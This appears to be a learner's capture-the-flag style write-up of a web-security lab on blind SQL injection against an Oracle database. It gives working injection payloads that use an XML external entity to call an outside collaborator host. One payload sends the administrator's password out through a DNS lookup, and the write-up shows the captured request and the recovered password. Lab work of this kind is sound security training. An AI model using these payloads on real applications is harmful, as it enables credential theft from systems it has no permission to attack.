Lab: Blind SQL injection with out-of-band data exfiltration

My burp collaborator subdomain: `lyn9rdpqvjp92kzn7ixitap9e0kq8f.burpcollaborator.net`

Gameplan:
* Perform a dns lookup against my subdomain to confirm that app is vulnerable
* Find out how to exfiltrate data through DNS

### Find out database server used

Oracle:

`' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://lyn9rdpqvjp92kzn7ixitap9e0kq8f.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--`

Result: Success, DNS lookup was performed against my subdomain


### We know that this site uses Oracle db... find out how to exfil data

Payload with exfil:

`' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lyn9rdpqvjp92kzn7ixitap9e0kq8f.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--`

^^^ Above will inject query info into the url as such: `<password>.lyn9rdpqvjp92kzn7ixitap9e0kq8f.burpcollaborator.net`


Executed the above payload, this is the request sent to collaborator:

`
GET / HTTP/1.0
Host: uvzfsibrjxnjzk1irswl.lyn9rdpqvjp92kzn7ixitap9e0kq8f.burpcollaborator.net
Content-Type: text/plain; charset=utf-8
`

So the password for the administrator user is: `uvzfsibrjxnjzk1irswl`